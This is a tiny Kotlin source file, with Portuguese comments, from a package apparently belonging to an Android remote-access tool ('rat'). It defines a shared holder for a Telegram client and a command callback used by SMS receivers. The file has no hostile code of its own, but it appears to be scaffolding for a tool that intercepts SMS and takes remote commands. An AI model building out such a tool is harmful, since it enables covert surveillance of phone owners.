package com.lab.rat.core

// Grafo compartilhado entre o serviço e receivers do processo.
// Receivers (ex.: SmsReceiver) precisam do client antes/depois do serviço existir;
// sendText é no-op seguro quando o client ainda não foi inicializado com token.
object ServiceGraph {
    @Volatile var tg: TelegramClient? = null
    @Volatile var onCommand: ((String) -> Unit)? = null
}
